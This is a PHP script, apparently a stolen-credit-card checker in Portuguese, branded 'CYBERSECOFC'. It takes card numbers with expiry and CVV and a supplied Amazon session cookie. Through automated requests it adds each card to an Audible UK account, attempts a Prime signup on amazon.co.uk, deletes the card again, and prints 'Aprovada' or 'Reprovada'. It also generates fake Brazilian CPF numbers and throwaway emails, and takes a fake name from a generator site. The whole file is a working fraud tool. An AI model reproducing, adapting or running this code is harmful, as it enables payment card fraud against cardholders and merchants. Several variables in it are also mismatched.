<?php
ignore_user_abort();
error_reporting(0);
session_start();
$time = time();

ini_set('memory_limit', '-1');

function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// $email = generate_email();
// $cpf = gerarCPF();


extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 4);
$parte3 = substr($cc, 8, 4);
$parte4 = substr($cc, 12, 4);

$json_str = file_get_contents('bins.json');
$bins     = json_decode($json_str, true);
$bin      = substr($cc, 0, 6);
if (isset($bins[$bin])) {

    $a = json_encode($bins[$bin]);

    $bandeira = getStr($a, 'bandeira":"', '"');
    $nivel    = getstr($a, 'level":"', '"');
    $bank     = getStr($a, 'banco":"', '"');
    $pais     = getstr($a, 'pais":"', '"');
    $puxad    = " $bandeira$nivel $bank $pais";
} else {

function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);
}

function generateRandomString($length = 12)
{
    $characters       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


#################################################
// by: YOSUKEDEV 

$info_bin = bin($lista);
$cookie1 = $_POST['cookie1'];
$cookie = trim($cookie1);

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.4devs.com.br',
    'Accept: */*',
    'Sec-Fetch-Dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://www.4devs.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'referer: https://www.4devs.com.br/gerador_de_pessoas'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
  $end = curl_exec($ch);  

unlink($cookies);
$bruxo_dev77 = trazer($end, '"nome":"','"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.co.uk/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    "Host: www.amazon.co.uk",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);

$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.co.uk/account/payments?ref=a_account_o_l2_nav_2");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$tok = trazer($add_card, 'name="csrfToken" value="', '"');
$tokenbruxo = urlencode($tok);

if ($tok === null) {
 
$tok = trazer($add_card, 'data-csrf-token="','"');
$tokenbruxo = urlencode($tok);

}

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.co.uk/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com$enco&relativeUrl=%2Fsubscription%2Fconfirmation&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Cookie: $cookie", 
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isMfaForAddCardComplete=false&isVerifyCvv=false&ref=a_accountPayments_c2_edit&selectPaymentOnSuccess=false&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=$bruxo_dev77&csrfToken=$tokenbruxo&country=GB&addressLine1=28%20Church%20St&addressLine2=&zipCode=CV36%204AP&city=SHIPSTON-ON-STOUR&useAsDefault=true&addressId=&accountHolderName=$bruxo_dev77");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$card_id = trazer($gerar_cardID, '"paymentId": "', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.co.uk/hp/wlp/pipeline/membersignup");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.co.uk",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=hp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify = curl_exec($curl);

$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.co.uk/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.co.uk",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$post_verify2 = curl_exec($curl);

$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.co.uk/hp/wlp/pipeline/actions");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.co.uk",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
));
curl_setopt($curl, CURLOPT_POSTFIELDS,"offerToken=$offertoken&session-id=$session_id&wlpLocation=prime_default&isAsinEligibleForFamilyBenefit=0&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&wlpLocation=prime_confirm&paymentMethodIdList=$card_id2");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$bruxo = curl_exec($curl);


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.co.uk/account/payments?ref=a_account_o_l2_nav_2&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Cookie: $cookie",
));
$resp = curl_exec($curl);

$a = trazer($resp, 'data-billing-address-id="', '"');
$b = trazer($resp, 'data-payment-id="', '"');
$c = trazer($resp, 'data-payment-id="', 'payment-type');
$c = trazer($c, 'data-csrf-token="', '"');
$d = trazer($resp, 'href="/account/payments', '">');
$cd = trazer($resp, 'data-tail="', '"');
$bruxoenc = urlencode($d);

$tipbruxo = trazer($resp, 'data-display-issuer-name="', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.co.uk/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$d&relativeUrl=%2Faccount%2Fpayments&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, '
isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isMfaForAddCardComplete=false&isVerifyCvv=false&ref=a_accountPayments_c2_1_delete&paymentId='.$b.'&billingAddressId='.$a.'&paymentType=CreditCard&tail='.$cd.'8&accountHolderName=renan%20guilherme&isValid=true&isDefault=true&issuerName='.$tipbruxo.'&displayIssuerName=Visa&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn');
 $resp   = curl_exec($curl);

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.co.uk/payments/optimus/delete?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$d&relativeUrl=%2Faccount%2Fpayments&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, 'isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isMfaForAddCardComplete=false&isVerifyCvv=false&ref=a_accountPayments_c2_1_delete&paymentId='.$b.'&billingAddressId='.$a.'&paymentType=CreditCard&tail='.$cd.'&accountHolderName=pedro%20sosa&isValid=true&isDefault=true&issuerName='.$tipbruxo.'&displayIssuerName=Visa&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn&statusStringKey=adbl_paymentswidget_delete_payment_success&statusSuccess=true&csrfTokenValid=true');
 $resp   = curl_exec($curl);

if (strpos($resp, 'Card successfully deleted.')) {
        $msg  = '✅';
        $err  = "REMOVIDO: $msg $err1";
    } else {
        $msg = '❌';
        $err = "REMOVIDO: $msg $err1";
    }

 if (strpos($bruxo, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {

    echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » $bin » <b> Retorno: <span class='text-success'> [ PAGAMENTO APROVADO 00 ] = REMOVIDO 1 : $msg ] </font></b> <b> »Tempo de Resposta: (" . (time() - $time) . " SEG) »  <span class='text-primary'>CYBERSECOFC ⚡</span><br></b></font><br>";
}  elseif (strpos($bruxo, 'Desculpe. Não foi possível concluir sua inscrição do Prime no momento. Se você ainda quiser participar do Prime, é possível se inscrever durante a finalização da compra.')) {

        echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » $bin » <b> Retorno: <span class='text-success'> [ PAGAMENTO APROVADO 00 ] = REMOVIDO 2 : $msg ] </font></b> <b> »Tempo de Resposta: (" . (time() - $time) . " SEG) » <span class='text-primary''>CYBERSECOFC ⚡</span><br></b></font><br>";
        
    }elseif (strpos($bruxo, 'InvalidInput')) {
    
   echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » $bin » <b> Retorno: <span class='text-danger'> [ PAGAMENTO RECUSADO ] = REMOVIDO 1: $msg ] </font></b> <b>Tempo de Resposta: (" . (time() - $time) . " SEG) » <span class='primary''>CYBERSECOFC ⚡</span><br></b></font><br>";
    curl_close($curl);
    exit();
	
       echo "<span class='badge badge-success'>Reprovada</span> » $cc|$mes|$ano|$cvv » $bin » <b> Retorno: <span class='text-success'> [ CARD INVALIDO | REMOVIDO: $msg ] </font></b> <b> »Tempo de Resposta: (" . (time() - $time) . " SEG) » <span class='text-primary''>CYBERSECOFC ⚡</span><br></b></font><br>";

} elseif (strpos($bruxo, 'HARDVET_VERIFICATION_FAILED')) {

    echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » $bin » <b> Retorno: <span class='text-danger'> [ PAGAMENTO RECUSADO ] = REMOVIDO 1: $msg ] </font></b> <b>Tempo de Resposta: (" . (time() - $time) . " SEG) » <span class='text-primary''>CYBERSECOFC ⚡</span><br></b></font><br>";
    curl_close($curl);
    exit();
} else {
    echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » $bin » <b> Retorno: <span class='text-danger'> [ TROCAR COOKIE | REMOVIDO: $msg ] </font></b> <b>Tempo de Resposta: (" . (time() - $time) . " SEG) » <span class='text-primary''>CYBERSECOFC ⚡</span><br></b></font><br>";
    curl_close($curl);
    exit();

        

             #   }
                }
